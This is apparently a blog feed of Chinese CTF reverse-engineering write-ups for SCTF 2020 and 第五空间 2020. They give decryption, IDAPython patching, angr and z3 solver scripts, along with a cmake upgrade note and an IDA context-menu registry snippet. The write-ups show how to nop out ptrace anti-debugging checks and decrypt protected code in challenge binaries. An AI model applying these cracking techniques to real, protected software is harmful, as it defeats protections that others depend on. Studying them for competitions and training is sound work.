class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><p>解得:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;SCTF&#123;We1c0m3_To_Sctf_2020_re_!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="get-up"><a href="#get-up" class="headerlink" title="get_up"></a>get_up</h2><p>有两处代码自修改。</p><p>第一处要求输入一个 md5 1万次等于<code>32c1d123c193aecc4280a5d7925a2504</code>的词, 用<a href="https://cmd5.la/c193aecc4280a5d7.htm">在线工具</a>查一下就知道单词是<code>sycsyc</code>, 然后根据输入解密代码</p><p>第二处输入flag, 长度要求是30, 然后根据前五个解密代码, 当然前五个肯定是<code>SCTF&#123;</code></p><p>最后会进入一个RC4的函数, 直接解密就可以了(所以发现前面做的都没用)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, os, hashlib, time, base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mydeRC4</span>(<span class="params">data, key</span>):</span></span><br><span class="line">    rc41 = ARC4.new(key)</span><br><span class="line">    decrypted = rc41.decrypt(data)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">a = [<span class="number">0x80</span>, <span class="number">85</span>, <span class="number">126</span>, <span class="number">45</span>, <span class="number">209</span>, <span class="number">9</span>, <span class="number">37</span>, <span class="number">171</span>, <span class="number">60</span>, <span class="number">86</span>, <span class="number">149</span>, <span class="number">196</span>, <span class="number">54</span>, <span class="number">19</span>, <span class="number">237</span>, <span class="number">114</span>, <span class="number">36</span>, <span class="number">147</span>, <span class="number">178</span>, <span class="number">200</span>, <span class="number">69</span>, <span class="number">236</span>, <span class="number">22</span>, <span class="number">107</span>, <span class="number">103</span>, <span class="number">29</span>, <span class="number">249</span>, <span class="number">163</span>, <span class="number">150</span>, <span class="number">217</span>]</span><br><span class="line">flag=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    flag += <span class="built_in">bytes</span>([a[i]])</span><br><span class="line"><span class="built_in">print</span>(mydeRC4(flag, <span class="string">&#x27;syclover&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="flag-detector"><a href="#flag-detector" class="headerlink" title="flag_detector"></a>flag_detector</h2><p>有个最新的upx, 官方工具upx -d即可</p><p>从ida中可以知道是用golang写的, gin是一个golang的web框架。访问<code>127.0.0.1:8000</code>即可这里不知道比赛的时候咋了, 第一个函数居然从main_main_fun1开始看, 傻了。赛后在main_main中找到路由表, 且为多级路由。</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200707232728163.png" alt="image-20200707232728163"></p><p>整理如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/v1/login ; 初始化config</span><br><span class="line">/v2/user  ; 初始化 asdf, 必须要有config</span><br><span class="line">/v2/flag  ; 初始化 hjkl, 必须要有config</span><br><span class="line">/v3/check ; 校验flag</span><br></pre></td></tr></table></figure><p>然后就可以开始调试了。校验flag的关键流程在machine函数里面, 实现了一个VM, <code>asdf</code>为VM指令, <code>hjkl</code>是flag的值</p><p>而这个VM卡住我的地方在这里, 即case 10和 case 11, 到后来才知道这里是保存当前的状态或者还原当前状态, 类似于<code>call</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200710201033197.png" alt="image-20200710201033197"></p><p>opcode 如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1 10 1 10 4 10 5 2 1 20 10 3 11 -2</span><br><span class="line">-1 18 11 -2</span><br><span class="line">-1 2 1 22 8 1 7 6 1 2 1 12 3 -11 1 2 1 13 20 11 -2</span><br><span class="line">-1 29 0 11 -2</span><br><span class="line">-1 10 2 21 8 22 7 5 2 2 20 10 3 1 2 1 8 23 7 9 24 20 10 6 2 1 12 3 -13 11 -2</span><br><span class="line">-1</span><br><span class="line">2 1 26 2 73 20 10 7</span><br><span class="line">2 2 26 2 89 20 10 7</span><br><span class="line">2 3 26 2 70 20 10 7</span><br><span class="line">2 4 26 2 84 20 10 7</span><br><span class="line">2 5 26 2 -111 20 10 7</span><br><span class="line">2 6 26 2 116 20 10 7</span><br><span class="line">2 7 26 2 103 20 10 7</span><br><span class="line">2 8 26 2 124 20 10 7</span><br><span class="line">2 9 26 2 121 20 10 7</span><br><span class="line">2 10 26 2 102 20 10 7</span><br><span class="line">2 11 26 2 99 20 10 7</span><br><span class="line">2 12 26 2 42 20 10 7</span><br><span class="line">2 13 26 2 124 20 10 7</span><br><span class="line">2 14 26 2 77 20 10 7</span><br><span class="line">2 15 26 2 121 20 10 7</span><br><span class="line">2 16 26 2 123 20 10 7</span><br><span class="line">2 17 26 2 43 20 10 7</span><br><span class="line">2 18 26 2 43 20 10 7</span><br><span class="line">2 19 26 2 77 20 10 7</span><br><span class="line">2 20 26 2 43 20 10 7</span><br><span class="line">2 21 26 2 43 20 10 7</span><br><span class="line">2 22 26 2 111 20 10 7 11</span><br><span class="line">-2</span><br><span class="line">-1 21 22 2 122 17 23 11 -2</span><br><span class="line">-1 10 8 27 22 21 13 8 4 7 5 2 2 20 10 3 11 -2</span><br><span class="line">-1 21 2 108 17 20 11 -2 -2</span><br></pre></td></tr></table></figure><p>指令处理起来, 不复杂。简单运算后, 逐字节比较。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="number">73</span>, <span class="number">89</span>, <span class="number">70</span>, <span class="number">84</span>, -<span class="number">111</span>, <span class="number">116</span>, <span class="number">103</span>, <span class="number">124</span>, <span class="number">121</span>, <span class="number">102</span>, <span class="number">99</span>, <span class="number">42</span>, <span class="number">124</span>, <span class="number">77</span>, <span class="number">121</span>, <span class="number">123</span>, <span class="number">43</span>, <span class="number">43</span>, <span class="number">77</span>, <span class="number">43</span>, <span class="number">43</span>, <span class="number">111</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">  flag += <span class="built_in">chr</span>(<span class="number">122</span> ^ ((<span class="number">108</span> ^ enc[i]) + <span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>flag:<code>SCTF&#123;functi0n_ca11_11&#125;</code></p><h2 id="easy-re"><a href="#easy-re" class="headerlink" title="easy_re"></a>easy_re</h2><h3 id="TLS回调函数"><a href="#TLS回调函数" class="headerlink" title="TLS回调函数"></a>TLS回调函数</h3><p>根据字符串找到的main函数中是假的逻辑, 但是里面有回调函数, 去看了下回调函数, 发现有个crc32算值以后来异或<code>data</code>段中的数据, 而且有两处, 经过调试可以知道异或的值是<code>0x61</code>和<code>0x78</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200709205751491.png" alt="image-20200709205751491"></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200710191214579.png" alt="image-20200710191214579"></p><p>把这两处异或的值patch成0, 再用idap ython脚本patch整段代码</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200710192159800.png" alt="image-20200710192159800"></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200710192224424.png" alt="image-20200710192224424"></p><p>idapy_patch.py:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line">addr = <span class="number">0x0417418</span></span><br><span class="line">length = <span class="number">34048</span></span><br><span class="line">xor_num = <span class="number">0x61</span></span><br><span class="line">buf = <span class="built_in">map</span>(<span class="built_in">ord</span>, ida_bytes.get_bytes(addr, length))</span><br><span class="line">buf = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: x ^ xor_num, buf)</span><br><span class="line">ida_bytes.patch_bytes(addr, <span class="built_in">str</span>(<span class="built_in">bytearray</span>(buf)))</span><br><span class="line"></span><br><span class="line">length = <span class="number">0x10A00</span> - <span class="number">0x8500</span></span><br><span class="line">xor_num = <span class="number">0x78</span></span><br><span class="line">addr = addr + <span class="number">0x8500</span></span><br><span class="line">buf = <span class="built_in">map</span>(<span class="built_in">ord</span>, ida_bytes.get_bytes(addr, length))</span><br><span class="line">buf = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: x ^ xor_num, buf)</span><br><span class="line">ida_bytes.patch_bytes(addr, <span class="built_in">str</span>(<span class="built_in">bytearray</span>(buf)))</span><br></pre></td></tr></table></figure><p>异或以后可以看到一个熟悉的字符串, 猜测可能是个程序, 再用ida python dump出这份dll</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200709210032769.png" alt="image-20200709210032769"></p><h3 id="主逻辑"><a href="#主逻辑" class="headerlink" title="主逻辑"></a>主逻辑</h3><p>下内存断点, 经过调试可以知道主逻辑在<code>0x0409FF0</code>, 里面调用了dll中的encode函数进行判断</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200710194131500.png" alt="image-20200710194131500"></p><p>题目中还有类似下面的花指令, 直接patch_nop掉就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200710102525686.png" alt="image-20200710102525686"></p><p>patch_nop:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_nop</span>(<span class="params">begin, end</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(end&gt;begin):</span><br><span class="line">        PatchByte(begin, <span class="number">0x90</span>)</span><br><span class="line">        begin=begin+<span class="number">1</span></span><br></pre></td></tr></table></figure><p><code>begin</code>是<code>pusha</code>地址, <code>end</code>是<code>popa</code>的下一条指令</p><p>这个函数还会导致堆栈不平衡, 依旧patch成nop, 接着就可以F5</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200710194512721.png" alt="image-20200710194512721"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>根据动态调试, encode函数首先用SCTF2020的hex后字符串做为密钥, 对输入AES_ECB加密, 然后加密后得到的中间部分21个字节被分成三组, 每组七个字节先异或运算然后做移位运算, 算法相同但是异或的值不同, 最后所有字节异或0x55。</p><p>AES Sbox</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200710110655424.png" alt="image-20200710110655424"></p><p>加密中间21字节</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200710112035085.png" alt="image-20200710112035085"></p><p>所有字节异或<code>0x55</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200710110034964.png" alt="image-20200710110034964"></p><p>解密脚本（借鉴了队内的一个师傅的脚本）:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">cmp_data = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">cmp_data[<span class="number">0</span>] = <span class="number">142</span></span><br><span class="line">cmp_data[<span class="number">1</span>] = <span class="number">56</span></span><br><span class="line">cmp_data[<span class="number">2</span>] = <span class="number">81</span></span><br><span class="line">cmp_data[<span class="number">3</span>] = <span class="number">115</span></span><br><span class="line">cmp_data[<span class="number">4</span>] = -<span class="number">90</span></span><br><span class="line">cmp_data[<span class="number">5</span>] = -<span class="number">103</span></span><br><span class="line">cmp_data[<span class="number">6</span>] = <span class="number">42</span></span><br><span class="line">cmp_data[<span class="number">7</span>] = -<span class="number">16</span></span><br><span class="line">cmp_data[<span class="number">8</span>] = -<span class="number">38</span></span><br><span class="line">cmp_data[<span class="number">9</span>] = -<span class="number">43</span></span><br><span class="line">cmp_data[<span class="number">10</span>] = <span class="number">106</span></span><br><span class="line">cmp_data[<span class="number">11</span>] = -<span class="number">111</span></span><br><span class="line">cmp_data[<span class="number">12</span>] = -<span class="number">23</span></span><br><span class="line">cmp_data[<span class="number">13</span>] = <span class="number">78</span></span><br><span class="line">cmp_data[<span class="number">14</span>] = -<span class="number">104</span></span><br><span class="line">cmp_data[<span class="number">15</span>] = -<span class="number">50</span></span><br><span class="line">cmp_data[<span class="number">16</span>] = <span class="number">42</span></span><br><span class="line">cmp_data[<span class="number">17</span>] = -<span class="number">73</span></span><br><span class="line">cmp_data[<span class="number">18</span>] = <span class="number">61</span></span><br><span class="line">cmp_data[<span class="number">19</span>] = <span class="number">64</span></span><br><span class="line">cmp_data[<span class="number">20</span>] = -<span class="number">15</span></span><br><span class="line">cmp_data[<span class="number">21</span>] = -<span class="number">27</span></span><br><span class="line">cmp_data[<span class="number">22</span>] = <span class="number">29</span></span><br><span class="line">cmp_data[<span class="number">23</span>] = -<span class="number">85</span></span><br><span class="line">cmp_data[<span class="number">24</span>] = -<span class="number">17</span></span><br><span class="line">cmp_data[<span class="number">25</span>] = -<span class="number">18</span></span><br><span class="line">cmp_data[<span class="number">26</span>] = -<span class="number">80</span></span><br><span class="line">cmp_data[<span class="number">27</span>] = -<span class="number">42</span></span><br><span class="line">cmp_data[<span class="number">28</span>] = <span class="number">20</span></span><br><span class="line">cmp_data[<span class="number">29</span>] = <span class="number">11</span></span><br><span class="line">cmp_data[<span class="number">30</span>] = <span class="number">42</span></span><br><span class="line">cmp_data[<span class="number">31</span>] = -<span class="number">107</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp_data)):</span><br><span class="line">        cmp_data[i] = (cmp_data[i]) &amp; <span class="number">0xff</span></span><br><span class="line">        cmp_data[i] ^= <span class="number">0x55</span></span><br><span class="line">        <span class="keyword">if</span> i &gt;= <span class="number">7</span> <span class="keyword">and</span> i &lt;= <span class="number">13</span>:</span><br><span class="line">            cmp_data[i] = cmp_data[i]//<span class="number">0x10</span> + (cmp_data[i] % <span class="number">0x10</span>)*<span class="number">0x10</span></span><br><span class="line">            cmp_data[i] ^= <span class="number">0xEF</span></span><br><span class="line">        <span class="keyword">if</span> i &gt;= <span class="number">14</span> <span class="keyword">and</span> i &lt;= <span class="number">20</span>:</span><br><span class="line">            cmp_data[i] = ((cmp_data[i] &amp; <span class="number">0xcc</span>) &gt;&gt; <span class="number">2</span>) | (</span><br><span class="line">                (cmp_data[i] &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xcc</span>)</span><br><span class="line">            cmp_data[i] ^= <span class="number">0xBE</span></span><br><span class="line">        <span class="keyword">if</span> i &gt;= <span class="number">21</span> <span class="keyword">and</span> i &lt;= <span class="number">27</span>:</span><br><span class="line">            cmp_data[i] = ((cmp_data[i] &amp; <span class="number">0xAA</span>) &gt;&gt; <span class="number">1</span>) | (</span><br><span class="line">                (cmp_data[i] &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xAA</span>)</span><br><span class="line">            cmp_data[i] ^= <span class="number">0xAD</span></span><br><span class="line">    <span class="built_in">print</span>(cmp_data)</span><br><span class="line">    flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp_data)):</span><br><span class="line">        flag += <span class="built_in">bytes</span>([cmp_data[i]])</span><br><span class="line">    key = <span class="string">b&quot;SCTF2020&quot;</span>.<span class="built_in">hex</span>()</span><br><span class="line">    <span class="built_in">print</span>(key)</span><br><span class="line">    aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="built_in">print</span>(aes.decrypt(flag))</span><br></pre></td></tr></table></figure><p>得到flag:</p><p><code>SCTF&#123;y0u_found_the_true_secret&#125;</code></p><h2 id="参考WP"><a href="#参考WP" class="headerlink" title="参考WP"></a>参考WP</h2><p><a href="https://mp.weixin.qq.com/s/au7wmC-JLapP5fxhen5qVw">星盟安全ctf战队——SCTF–WriteUp</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>update-cmake</title>
      <link href="/tool-update-cmake/"/>
      <url>/tool-update-cmake/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>由于wsl使用<code>apt install</code>下来的<code>cmake</code>版本过低, 无法使用<code>C++17</code>, 因此需要更新<code>cmake</code>版本</p><p>报错信息:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CMake * or higher is required</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://askubuntu.com/questions/829310/how-to-upgrade-cmake-in-ubuntu">How to upgrade cmake in Ubuntu [duplicate]</a></p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><ul><li>Ubuntu18.04 LTS</li></ul><ol><li><p>移除旧版<code>cmake</code>:<code>sudo apt remove cmake</code></p></li><li><p>下载新版安装包: 从官网 <a href="https://cmake.org/download/">https://cmake.org/download/</a> 下载最新版本（当前最新为<code>cmake-3.18.0-rc3-Linux-x86_64.sh</code>）到<code>/opt</code>目录下</p></li><li><p>添加权限<code>sudo chmod +x cmake-3.18.0-rc3-Linux-x86_64.sh</code></p></li><li><p>安装<code>sudo ./cmake-3.18.0-rc3-Linux-x86_64.sh</code></p></li><li><p>链接<code>sudo ln -s /opt/cmake-3.18.0-rc3-Linux-x86_64/bin/* /usr/local/bin</code><strong>注意这里要使用绝对路径</strong></p></li><li><p>成功更新</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">➜  bin cmake --version</span><br><span class="line">cmake version <span class="number">3</span>.<span class="number">18</span>.<span class="number">0</span>-rc3</span><br><span class="line"></span><br><span class="line">CMake suite maintained and supported by Kitware (kitware.com/cmake).</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA 添加至右键菜单</title>
      <link href="/else-ida-add-to-right/"/>
      <url>/else-ida-add-to-right/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\*\shell\IDAx86]</span><br><span class="line">@=&quot;Open with IDA x86&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;D:\\CTF\\Tools\\ida_pro_7.0\\ida.exe&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\*\shell\IDAx86\command]</span><br><span class="line">@=&quot;D:\\CTF\\Tools\\ida_pro_7.0\\ida.exe %1&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\*\shell\IDAx64]</span><br><span class="line">@=&quot;Open with IDA x64&quot;</span><br><span class="line">&quot;Icon&quot;=&quot;D:\\CTF\\Tools\\ida_pro_7.0\\ida64.exe&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\*\shell\IDAx64\command]</span><br><span class="line">@=&quot;D:\\CTF\\Tools\\ida_pro_7.0\\ida64.exe %1&quot;</span><br></pre></td></tr></table></figure><ul><li>记得要修改为自己的路径</li></ul>]]></content>
      
      
      <categories>
          
          <category> ELSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ELSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 第五空间 CTF</title>
      <link href="/wp-games-2020fifthspace/"/>
      <url>/wp-games-2020fifthspace/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul><li>还是太菜了……..</li></ul><h2 id="Nop"><a href="#Nop" class="headerlink" title="Nop"></a>Nop</h2><p>主要是有两个反调试以及一堆花指令</p><p>反调试的原理主要是判断程序有没有被ptrace, nop掉就好了</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200703165937000.png" alt="image-20200703165937000"></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200703170106318.png" alt="image-20200703170106318"></p><p>接着是一堆花指令, 这堆花指令我们可以直接nop掉, 最后结果如下:</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200703170755432.png" alt="image-20200703170755432"></p><p>这里就是将输入的值自增三次以及加上0xCCCCCCCC, 由于是word类型因此这里会产生溢出。</p><p>为了jmp到right, 我们需要把jmp到Wrong这一句nop掉, 因此需要nop的地址就是0x08048765</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200703170845998.png" alt="image-20200703170845998"></p><p><strong>所以结果就是(0x08048765 - 0xCCCCCCCC) &amp; 0xFFFFFFFF - 3 = 993507992</strong></p><h2 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h2><p>打开看大致是个虚拟机, 用angr直接跑就可以了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line">    project = angr.Project(bin_path, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    argv1 = claripy.BVS(<span class="string">&quot;argv1&quot;</span>, <span class="number">40</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    init_state = project.factory.entry_state(args=[bin_path, argv1])</span><br><span class="line">    simgr = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果 &quot;right&quot; 在输出流中</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;right&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果 &quot;wrong&quot; 在输出流中</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;wrong&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(simgr.explore(find=is_successful, avoid=should_abort))</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(argv1, cast_to=<span class="built_in">bytes</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果:</p><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 s.py rev_v2</span><br><span class="line">&lt;SimulationManager with <span class="number">1</span> active, <span class="number">1</span> found, <span class="number">2</span> avoid&gt;</span><br><span class="line">b&#x27;ctf&#123;ropchain_is_g00d&#125;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br></pre></td></tr></table></figure><h2 id="ManageCode"><a href="#ManageCode" class="headerlink" title="ManageCode"></a>ManageCode</h2><p>用神器 dnspy 32 调试程序, 流程如下:</p><p>输入flag以后进行验证</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200703171844216.png" alt="image-20200703171844216"></p><p>验证逻辑是:</p><ol><li><p>flag格式</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200703172003879.png" alt="image-20200703172003879"></p></li><li><p>flag</p></li></ol><p>调用check_477进行验证</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200703172119088.png" alt="image-20200703172119088"></p><p>而根据所给信息, RVA是在文件中的偏移, 我们可以直接用IDA打开, 跳转到首地址加偏移的位置</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200703172550924.png" alt="image-20200703172550924"></p><p>可以看到是一个函数, 一堆方程, 这里用Z3直接解出来就可以了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">a1 = [BitVec(<span class="string">&quot;x%d&quot;</span>%i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">v1 = <span class="number">1</span></span><br><span class="line">v2 = a1[<span class="number">0</span>]</span><br><span class="line">v33 = a1[<span class="number">0</span>]</span><br><span class="line">v3 = a1[<span class="number">2</span>]</span><br><span class="line">v31 = a1[<span class="number">2</span>]</span><br><span class="line">s.add (-<span class="number">307337</span> * v2 == -<span class="number">29811689</span>)</span><br><span class="line">v4 = a1[<span class="number">1</span>]</span><br><span class="line">v32 = a1[<span class="number">1</span>]</span><br><span class="line">s.add (<span class="number">31219</span> * v2 - <span class="number">470462</span> * v4 == -<span class="number">7321921</span>)</span><br><span class="line">v5 = <span class="number">282799</span> * v4</span><br><span class="line">v6 = a1[<span class="number">3</span>]</span><br><span class="line">v30 = a1[<span class="number">3</span>]</span><br><span class="line">s.add (v5 + <span class="number">145509</span> * v3 - <span class="number">299180</span> * v33 == <span class="number">13723877</span>)</span><br><span class="line">v7 = v1</span><br><span class="line">s.add (<span class="number">475769</span> * v6 - <span class="number">175678</span> * v32 - <span class="number">389730</span> * v3 - <span class="number">482630</span> * v33 == -<span class="number">95216128</span>)</span><br><span class="line">v29 = a1[<span class="number">4</span>]</span><br><span class="line">s.add (-<span class="number">491556</span> * v33 - <span class="number">36988</span> * v29 + <span class="number">107882</span> * v32 + -<span class="number">208516</span> * v6 - <span class="number">340530</span> * v3 == -<span class="number">159608574</span>)</span><br><span class="line">v8 = a1[<span class="number">5</span>]</span><br><span class="line">v27 = v8</span><br><span class="line">s.add (<span class="number">115318</span> * v8 + <span class="number">467004</span> * v33 + <span class="number">110069</span> * v29 + <span class="number">82828</span> * v31 - <span class="number">14270</span> * v32 - <span class="number">303753</span> * v6 == <span class="number">59922906</span>)</span><br><span class="line">v9 = a1[<span class="number">6</span>]</span><br><span class="line">v28 = v9</span><br><span class="line">s.add (-<span class="number">279354</span> * v8 - <span class="number">301605</span> * v30 + <span class="number">336041</span> * v33 + <span class="number">45022</span> * v31 + <span class="number">111726</span> * v32 - <span class="number">146340</span> * v29 - <span class="number">237939</span> * v9 == -<span class="number">82351664</span>)</span><br><span class="line">v10 = a1[<span class="number">7</span>]</span><br><span class="line">v26 = v10</span><br><span class="line">s.add (-<span class="number">147932</span> * v29</span><br><span class="line">        - <span class="number">23111</span> * v27</span><br><span class="line">        + <span class="number">356418</span> * v30</span><br><span class="line">        + <span class="number">157129</span> * v9</span><br><span class="line">        + <span class="number">96850</span> * v31</span><br><span class="line">        + <span class="number">459807</span> * v10</span><br><span class="line">        + -<span class="number">239175</span> * v33</span><br><span class="line">        - <span class="number">15611</span> * v32 == <span class="number">54529836</span>)</span><br><span class="line">v11 = a1[<span class="number">8</span>]</span><br><span class="line">v25 = v11</span><br><span class="line">s.add (-<span class="number">288572</span> * v10</span><br><span class="line">        - <span class="number">452860</span> * v11</span><br><span class="line">        - <span class="number">281026</span> * v31</span><br><span class="line">        + <span class="number">459847</span> * v29</span><br><span class="line">        + <span class="number">105871</span> * v32</span><br><span class="line">        + <span class="number">363927</span> * v28</span><br><span class="line">        + <span class="number">107668</span> * v33</span><br><span class="line">        + <span class="number">305746</span> * v27</span><br><span class="line">        + <span class="number">474305</span> * v30 == <span class="number">94077867</span>)</span><br><span class="line">v12 = a1[<span class="number">9</span>]</span><br><span class="line">v24 = a1[<span class="number">9</span>]</span><br><span class="line">v13 = v7</span><br><span class="line">s.add (<span class="number">24450</span> * v32</span><br><span class="line">        + <span class="number">318367</span> * v27</span><br><span class="line">        + <span class="number">131436</span> * v33</span><br><span class="line">        + <span class="number">163730</span> * v31</span><br><span class="line">        + <span class="number">68350</span> * v30</span><br><span class="line">        + -<span class="number">200364</span> * v12</span><br><span class="line">        - <span class="number">367700</span> * v26</span><br><span class="line">       